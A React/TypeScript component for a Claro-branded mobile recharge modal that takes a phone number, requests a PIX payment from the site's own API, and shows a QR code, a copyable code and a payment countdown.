"use client"

import { useEffect, useMemo, useRef, useState } from "react"
import { X, Copy, Clock, Check } from "lucide-react"

type Step = "phone" | "payment"

type PixData = {
  txid: string
  qrCode: string
  expiresAt: string
  amount: number
  phone: string
}

interface RechargeModalProps {
  value: number | null
  onClose: () => void
}

function formatPhone(raw: string) {
  const digits = raw.replace(/\D/g, "").slice(0, 11)
  if (digits.length <= 2) return digits
  if (digits.length <= 7) return `(${digits.slice(0, 2)}) ${digits.slice(2)}`
  return `(${digits.slice(0, 2)}) ${digits.slice(2, 7)}-${digits.slice(7)}`
}

function formatCurrency(value: number) {
  return value.toLocaleString("pt-BR", {
    style: "currency",
    currency: "BRL",
  })
}

export default function RechargeModal({ value, onClose }: RechargeModalProps) {
  const [step, setStep] = useState<Step>("phone")
  const [phone, setPhone] = useState("")
  const [loading, setLoading] = useState(false)
  const [pixData, setPixData] = useState<PixData | null>(null)
  const [copied, setCopied] = useState(false)
  const [timeLeft, setTimeLeft] = useState<number>(0)
  const [error, setError] = useState<string | null>(null)
  const inputRef = useRef<HTMLInputElement>(null)

  const isOpen = value !== null
  const phoneDigits = phone.replace(/\D/g, "")
  const phoneValid = phoneDigits.length === 11 || phoneDigits.length === 10

  // Lock body scroll while open
  useEffect(() => {
    if (isOpen) {
      document.body.style.overflow = "hidden"
    }
    return () => {
      document.body.style.overflow = ""
    }
  }, [isOpen])

  // Focus input on open
  useEffect(() => {
    if (isOpen && step === "phone") {
      setTimeout(() => inputRef.current?.focus(), 50)
    }
  }, [isOpen, step])

  // Countdown for payment step
  useEffect(() => {
    if (step !== "payment" || !pixData) return
    const target = new Date(pixData.expiresAt).getTime()

    const tick = () => {
      const remaining = Math.max(0, Math.floor((target - Date.now()) / 1000))
      setTimeLeft(remaining)
    }

    tick()
    const id = setInterval(tick, 1000)
    return () => clearInterval(id)
  }, [step, pixData])

  const timeFormatted = useMemo(() => {
    const m = Math.floor(timeLeft / 60)
      .toString()
      .padStart(2, "0")
    const s = (timeLeft % 60).toString().padStart(2, "0")
    return `${m}:${s}`
  }, [timeLeft])

  if (!isOpen) return null

  const handleClose = () => {
    setStep("phone")
    setPhone("")
    setPixData(null)
    setCopied(false)
    setError(null)
    onClose()
  }

  const handleContinue = async () => {
    if (!phoneValid || value === null) return
    setLoading(true)
    setError(null)
    try {
      const res = await fetch("/api/pix/create", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ value, phone: phoneDigits }),
      })
      if (!res.ok) throw new Error("Falha ao gerar PIX")
      const data = (await res.json()) as PixData
      setPixData(data)
      setStep("payment")
    } catch (err) {
      console.log("[v0] Erro PIX:", err)
      setError("Não foi possível gerar o PIX. Tente novamente.")
    } finally {
      setLoading(false)
    }
  }

  const handleCopy = async () => {
    if (!pixData) return
    try {
      await navigator.clipboard.writeText(pixData.qrCode)
      setCopied(true)
      setTimeout(() => setCopied(false), 2500)
    } catch (err) {
      console.log("[v0] Erro ao copiar:", err)
    }
  }

  return (
    <div
      className="recharge-modal-overlay"
      role="dialog"
      aria-modal="true"
      aria-labelledby="recharge-modal-title"
      onClick={handleClose}
    >
      <div
        className={`recharge-modal ${step === "payment" ? "recharge-modal--payment" : ""}`}
        onClick={(e) => e.stopPropagation()}
      >
        <button
          type="button"
          className="recharge-modal-close"
          onClick={handleClose}
          aria-label="Fechar"
        >
          <X size={22} />
        </button>

        {step === "phone" && (
          <div className="recharge-step">
            <div className="recharge-brand">
              <img
                src="/images/claro-logo.png"
                alt="Claro"
                className="recharge-brand-logo"
              />
              <span className="recharge-brand-text">recarga</span>
            </div>

            <h2 id="recharge-modal-title" className="recharge-title">
              Faça uma recarga e aproveite para
              <br />
              falar e navegar ainda mais.
            </h2>

            {value !== null && (
              <p className="recharge-selected-value">
                Valor selecionado: <strong>{formatCurrency(value)}</strong>
              </p>
            )}

            <div className="recharge-field">
              <label htmlFor="recharge-phone" className="recharge-field-label">
                Digite seu nº claro
              </label>
              <input
                id="recharge-phone"
                ref={inputRef}
                type="tel"
                inputMode="numeric"
                autoComplete="tel"
                className="recharge-field-input"
                value={phone}
                onChange={(e) => setPhone(formatPhone(e.target.value))}
                onKeyDown={(e) => {
                  if (e.key === "Enter" && phoneValid && !loading) {
                    handleContinue()
                  }
                }}
                placeholder="(00) 00000-0000"
                maxLength={15}
              />
            </div>

            {error && <p className="recharge-error">{error}</p>}

            <button
              type="button"
              className="recharge-continue-btn"
              disabled={!phoneValid || loading}
              onClick={handleContinue}
            >
              {loading ? "Gerando PIX..." : "Continuar"}
            </button>
          </div>
        )}

        {step === "payment" && pixData && (
          <div className="recharge-payment">
            <div className="recharge-payment-brand">
              <img
                src="/images/claro-logo.png"
                alt="Claro"
                className="recharge-payment-logo"
              />
              <span className="recharge-payment-brand-text">Recarga</span>
            </div>

            <h2 className="recharge-payment-title">Pagamento via PIX</h2>
            <p className="recharge-payment-info">
              Recarga de <strong>{formatCurrency(pixData.amount)}</strong> para{" "}
              <strong>{formatPhone(pixData.phone)}</strong>
            </p>

            <div className="recharge-payment-timer">
              <Clock size={20} />
              <span>{timeFormatted}</span>
            </div>
            <div className="recharge-payment-timer-bar">
              <div
                className="recharge-payment-timer-fill"
                style={{
                  width: `${Math.max(0, Math.min(100, (timeLeft / 600) * 100))}%`,
                }}
              />
            </div>
            <p className="recharge-payment-timer-label">
              Tempo restante para pagamento
            </p>

            <div className="recharge-qr-card">
              <img
                src={`https://api.qrserver.com/v1/create-qr-code/?size=240x240&margin=0&data=${encodeURIComponent(pixData.qrCode)}`}
                alt="QR Code PIX"
                width={220}
                height={220}
                className="recharge-qr-img"
              />
            </div>

            <button
              type="button"
              className="recharge-copy-btn"
              onClick={handleCopy}
            >
              {copied ? <Check size={20} /> : <Copy size={20} />}
              {copied ? "Código copiado!" : "Copiar código PIX"}
            </button>

            <div className="recharge-pix-code">{pixData.qrCode}</div>

            <p className="recharge-payment-hint">
              Escaneie o QR Code acima ou toque no botão para copiar o código
              PIX e cole no app do seu banco.
            </p>

            <div className="recharge-payment-status">
              <span className="recharge-status-dot" />
              Aguardando pagamento
            </div>
          </div>
        )}
      </div>
    </div>
  )
}
